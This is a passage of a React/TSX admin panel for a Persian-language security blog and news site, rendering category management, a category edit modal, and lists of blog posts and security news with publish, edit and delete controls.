                <FolderTree className="w-4 h-4 text-emerald-600 dark:text-emerald-400" />
                <span>لیست دسته‌بندی‌های رسمی مقالات و اخبار</span>
              </h3>
              <p className="text-xs text-slate-500 dark:text-slate-400">
                دسته‌بندی‌های زیر در تمام فرم‌های ثبت پست و فیلترهای وبلاگ و اخبار امنیت نمایش داده می‌شوند.
              </p>
            </div>
            <button
              onClick={handleStartNewCategory}
              className="px-4 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-bold flex items-center gap-1.5 cursor-pointer self-start sm:self-auto"
            >
              <Plus className="w-4 h-4" />
              <span>افزودن دسته‌بندی جدید</span>
            </button>
          </div>

          {/* Categories Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {categories.map((cat) => {
              const blogCount = blogPosts.filter(
                (p) => p.category === cat.name || p.categoryId === cat.slug
              ).length;
              const newsCount = newsArticles.filter(
                (n) => n.category === cat.name || n.categoryId === cat.slug
              ).length;

              return (
                <div
                  key={cat.id}
                  className="p-5 rounded-2xl bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 space-y-3 shadow-xs"
                >
                  <div className="flex items-start justify-between gap-3">
                    <div className="space-y-1 min-w-0">
                      <div className="flex items-center gap-2 flex-wrap">
                        <span className="font-extrabold text-sm text-slate-900 dark:text-white">
                          {cat.name}
                        </span>
                        <span className="font-mono text-[11px] px-2 py-0.5 rounded-md bg-slate-100 dark:bg-slate-800 text-slate-600 dark:text-slate-300">
                          {cat.slug}
                        </span>
                        <span
                          className={`text-[10px] px-2 py-0.5 rounded-md font-bold ${
                            cat.targetType === "blog"
                              ? "bg-blue-500/10 text-blue-600 dark:text-blue-400 border border-blue-500/30"
                              : cat.targetType === "news"
                              ? "bg-rose-500/10 text-rose-600 dark:text-rose-400 border border-rose-500/30"
                              : "bg-emerald-500/10 text-emerald-700 dark:text-emerald-400 border border-emerald-500/30"
                          }`}
                        >
                          {cat.targetType === "blog"
                            ? "فقط وبلاگ"
                            : cat.targetType === "news"
                            ? "فقط اخبار"
                            : "عمومی (وبلاگ + اخبار)"}
                        </span>
                      </div>
                      {cat.description && (
                        <p className="text-xs text-slate-600 dark:text-slate-400 leading-relaxed">
                          {cat.description}
                        </p>
                      )}
                    </div>

                    <div className="flex items-center gap-1.5 shrink-0">
                      <button
                        onClick={() => {
                          setEditingCategory(cat);
                          setIsNewCategoryModal(true);
                        }}
                        className="p-2 rounded-xl bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 transition-colors cursor-pointer"
                        title="ویرایش دسته‌بندی"
                      >
                        <Edit3 className="w-3.5 h-3.5" />
                      </button>
                      <button
                        onClick={() => handleDeleteCategory(cat.id)}
                        className="p-2 rounded-xl bg-rose-50 dark:bg-rose-950/40 hover:bg-rose-100 dark:hover:bg-rose-900/60 text-rose-600 dark:text-rose-400 transition-colors cursor-pointer border border-rose-200 dark:border-rose-900/40"
                        title="حذف دسته‌بندی"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>

                  <div className="pt-3 border-t border-slate-100 dark:border-slate-800 flex items-center justify-between text-xs text-slate-500 dark:text-slate-400">
                    <div className="flex items-center gap-3">
                      <span>مقالات وبلاگ: <strong className="text-slate-900 dark:text-white font-bold">{blogCount}</strong></span>
                      <span>·</span>
                      <span>اخبار امنیت: <strong className="text-slate-900 dark:text-white font-bold">{newsCount}</strong></span>
                    </div>
                    <span className="text-[11px] font-mono text-emerald-600 dark:text-emerald-400">
                      فعال در سیستم
                    </span>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Edit/Create Category Modal */}
          {isNewCategoryModal && editingCategory && (
            <div
              className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4 animate-in fade-in duration-200"
              onClick={() => setIsNewCategoryModal(false)}
            >
              <div
                className="w-full max-w-lg bg-white dark:bg-slate-900 border border-slate-200 dark:border-slate-800 rounded-2xl p-6 space-y-5 text-slate-800 dark:text-slate-200 shadow-2xl animate-in zoom-in-95 duration-200"
                onClick={(e) => e.stopPropagation()}
                style={{ direction: "rtl" }}
              >
                <div className="flex items-center justify-between border-b border-slate-200 dark:border-slate-800 pb-3">
                  <div className="flex items-center gap-2">
                    <FolderTree className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                    <h3 className="font-extrabold text-slate-900 dark:text-white text-base">
                      {editingCategory.name ? "ویرایش دسته‌بندی" : "افزودن دسته‌بندی جدید"}
                    </h3>
                  </div>
                  <button
                    onClick={() => setIsNewCategoryModal(false)}
                    className="p-1 rounded-lg text-slate-400 hover:text-slate-600 dark:hover:text-white"
                  >
                    <X className="w-5 h-5" />
                  </button>
                </div>

                <form onSubmit={handleSaveCategory} className="space-y-4 text-xs">
                  <div className="space-y-1.5">
                    <label className="font-bold text-slate-700 dark:text-slate-300 block">
                      نام دسته‌بندی (فارسی) *
                    </label>
                    <input
                      type="text"
                      required
                      value={editingCategory.name}
                      onChange={(e) =>
                        setEditingCategory({ ...editingCategory, name: e.target.value })
                      }
                      placeholder="مثال: حملات زنجیره تامین (Supply Chain)"
                      className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-300 dark:border-slate-800 rounded-xl px-3.5 py-2.5 text-slate-900 dark:text-white focus:border-emerald-500 focus:outline-none"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <label className="font-bold text-slate-700 dark:text-slate-300 block">
                      شناسه یکتا یا نامک انگلیسی (Slug)
                    </label>
                    <input
                      type="text"
                      value={editingCategory.slug}
                      onChange={(e) =>
                        setEditingCategory({ ...editingCategory, slug: e.target.value })
                      }
                      placeholder="مثال: supply-chain"
                      style={{ direction: "ltr", textAlign: "left" }}
                      className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-300 dark:border-slate-800 rounded-xl px-3.5 py-2.5 text-emerald-700 dark:text-emerald-400 font-mono focus:border-emerald-500 focus:outline-none"
                    />
                  </div>

                  <div className="space-y-1.5">
                    <label className="font-bold text-slate-700 dark:text-slate-300 block">
                      بخش مجاز استفاده (دامنه دسته‌بندی)
                    </label>
                    <select
                      value={editingCategory.targetType || "all"}
                      onChange={(e) =>
                        setEditingCategory({
                          ...editingCategory,
                          targetType: e.target.value as "all" | "blog" | "news",
                        })
                      }
                      className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-300 dark:border-slate-800 rounded-xl px-3.5 py-2.5 text-slate-900 dark:text-white"
                    >
                      <option value="all">عمومی (هم وبلاگ و هم اخبار امنیت)</option>
                      <option value="blog">فقط مقالات وبلاگ تخصصی</option>
                      <option value="news">فقط اخبار امنیت</option>
                    </select>
                  </div>

                  <div className="space-y-1.5">
                    <label className="font-bold text-slate-700 dark:text-slate-300 block">
                      توضیحات کوتاه دسته‌بندی
                    </label>
                    <textarea
                      rows={3}
                      value={editingCategory.description || ""}
                      onChange={(e) =>
                        setEditingCategory({ ...editingCategory, description: e.target.value })
                      }
                      placeholder="شرح کوتاه درباره مقالات و اخباری که در این بخش منتشر می‌شوند..."
                      className="w-full bg-slate-50 dark:bg-slate-950 border border-slate-300 dark:border-slate-800 rounded-xl px-3.5 py-2.5 text-slate-900 dark:text-white"
                    />
                  </div>

                  <div className="flex items-center justify-end gap-3 pt-3 border-t border-slate-200 dark:border-slate-800">
                    <button
                      type="button"
                      onClick={() => setIsNewCategoryModal(false)}
                      className="px-4 py-2 rounded-xl bg-slate-100 dark:bg-slate-800 text-slate-700 dark:text-slate-300 font-bold cursor-pointer"
                    >
                      انصراف
                    </button>
                    <button
                      type="submit"
                      disabled={saving}
                      className="flex items-center gap-1.5 px-5 py-2 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold cursor-pointer"
                    >
                      <Save className="w-4 h-4" />
                      <span>{saving ? "در حال ذخیره..." : "ذخیره دسته‌بندی"}</span>
                    </button>
                  </div>
                </form>
              </div>
            </div>
          )}
        </div>
      )}

      {/* Sub-tab 1: Blog Posts List */}
      {cmsSubTab === "blog" && (
        <div className="space-y-3">
          {loading ? (
            <div className="p-10 text-center text-xs text-slate-400">
              در حال بارگذاری مقالات از دیتابیس...
            </div>
          ) : (
            blogPosts.map((post) => (
              <div
                key={post.id}
                className="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 flex flex-col lg:flex-row lg:items-center justify-between gap-4"
              >
                <div className="space-y-1.5 min-w-0">
                  <div className="flex flex-wrap items-center gap-2 text-xs">
                    <span
                      className={`px-2 py-0.5 rounded-md font-bold text-[11px] ${
                        post.status === "published"
                          ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"
                          : "bg-amber-500/15 text-amber-400 border border-amber-500/30"
                      }`}
                    >
                      {post.status === "published" ? "منتشرشده" : "پیش‌نویس"}
                    </span>
                    {post.isFeatured && (
                      <span className="inline-flex items-center gap-1 text-[11px] font-bold text-amber-400">
                        <Star className="w-3.5 h-3.5 fill-amber-400" />
                        <span>مقاله ویژه سرخط</span>
                      </span>
                    )}
                    <span className="text-slate-500">·</span>
                    <span className="text-emerald-400 font-semibold">{post.category}</span>
                    <span className="text-slate-500">·</span>
                    <span className="text-slate-400">{post.date}</span>
                    <span className="text-slate-500">·</span>
                    <span className="text-slate-400 flex items-center gap-1">
                      <Eye className="w-3.5 h-3.5" />
                      {post.views || 0} بازدید
                    </span>
                  </div>

                  <h3 className="text-sm sm:text-base font-bold text-white truncate">
                    {post.title}
                  </h3>
                  <p className="text-xs text-slate-400 line-clamp-1">{post.summary}</p>
                </div>

                <div className="flex flex-wrap items-center gap-2 shrink-0 text-xs">
                  {onOpenBlogPost && (
                    <button
                      onClick={() => onOpenBlogPost(post.slug)}
                      className="flex items-center gap-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 hover:border-emerald-500/40 text-slate-200 font-semibold cursor-pointer"
                    >
                      <ExternalLink className="w-3.5 h-3.5 text-emerald-400" />
                      <span>مشاهده صفحه مقاله</span>
                    </button>
                  )}

                  <button
                    onClick={() => handleToggleBlogStatus(post)}
                    className="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold cursor-pointer"
                  >
                    {post.status === "published" ? "تبدیل به پیش‌نویس" : "انتشار عمومی"}
                  </button>

                  <button
                    onClick={() => handleOpenEditBlog(post)}
                    className="flex items-center gap-1 px-3.5 py-2 rounded-xl bg-emerald-600/20 border border-emerald-500/40 text-emerald-300 font-bold cursor-pointer"
                  >
                    <Edit3 className="w-3.5 h-3.5" />
                    <span>ویرایش کامل</span>
                  </button>

                  <button
                    onClick={() => handleDeleteBlog(post.id)}
                    className="p-2 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-400 hover:bg-rose-500/20 cursor-pointer"
                    title="حذف مقاله"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      )}

      {/* Sub-tab 2: Security News List */}
      {cmsSubTab === "news" && (
        <div className="space-y-3">
          {loading ? (
            <div className="p-10 text-center text-xs text-slate-400">
              در حال بارگذاری اخبار امنیتی از دیتابیس...
            </div>
          ) : (
            newsArticles.map((article) => (
              <div
                key={article.id}
                className="rounded-2xl bg-slate-900/90 border border-slate-800 p-5 flex flex-col lg:flex-row lg:items-center justify-between gap-4"
              >
                <div className="space-y-1.5 min-w-0">
                  <div className="flex flex-wrap items-center gap-2 text-xs">
                    <span
                      className={`px-2 py-0.5 rounded-md font-bold text-[11px] ${
                        article.status === "published"
                          ? "bg-emerald-500/15 text-emerald-400 border border-emerald-500/30"
                          : "bg-amber-500/15 text-amber-400 border border-amber-500/30"
                      }`}
                    >
                      {article.status === "published" ? "منتشرشده" : "پیش‌نویس"}
                    </span>
                    <span className="font-mono font-bold text-rose-400">
                      [{article.severity}]
                    </span>
                    {article.isBreaking && (
                      <span className="inline-flex items-center gap-1 text-[11px] font-bold text-rose-400">
                        <Flame className="w-3.5 h-3.5" />
                        <span>سرخط فوری</span>
                      </span>
                    )}
                    <span className="text-slate-500">·</span>
                    <span className="text-emerald-400 font-semibold">
                      {article.categoryLabel}
                    </span>
                    <span className="text-slate-500">·</span>
                    <span className="text-slate-400">{article.date}</span>
                    <span className="text-slate-500">·</span>
                    <span className="text-slate-400">{article.views || 0} بازدید</span>
                  </div>

                  <h3 className="text-sm sm:text-base font-bold text-white truncate">
                    {article.title}
                  </h3>
                  <p className="text-xs text-slate-400 line-clamp-1">{article.summary}</p>
                </div>

                <div className="flex flex-wrap items-center gap-2 shrink-0 text-xs">
                  {onOpenNewsArticle && (
                    <button
                      onClick={() => onOpenNewsArticle(article.slug)}
                      className="flex items-center gap-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 hover:border-emerald-500/40 text-slate-200 font-semibold cursor-pointer"
                    >
                      <ExternalLink className="w-3.5 h-3.5 text-emerald-400" />
                      <span>مشاهده صفحه خبر</span>
                    </button>
                  )}

                  <button
                    onClick={() => handleToggleNewsStatus(article)}
                    className="px-3 py-2 rounded-xl bg-slate-950 border border-slate-800 hover:border-slate-700 text-slate-300 font-semibold cursor-pointer"
                  >
                    {article.status === "published" ? "تبدیل به پیش‌نویس" : "انتشار عمومی"}
                  </button>

                  <button
                    onClick={() => handleOpenEditNews(article)}
                    className="flex items-center gap-1 px-3.5 py-2 rounded-xl bg-emerald-600/20 border border-emerald-500/40 text-emerald-300 font-bold cursor-pointer"
                  >
                    <Edit3 className="w-3.5 h-3.5" />
                    <span>ویرایش خبر</span>
                  </button>

                  <button
                    onClick={() => handleDeleteNews(article.id)}
                    className="p-2 rounded-xl bg-rose-500/10 border border-rose-500/30 text-rose-400 hover:bg-rose-500/20 cursor-pointer"
                    title="حذف خبر"
                  >
                    <Trash2 className="w-4 h-4" />
                  </button>
                </div>
              </div>
            ))
          )}
        </div>
      )}
    </div>
  );
};
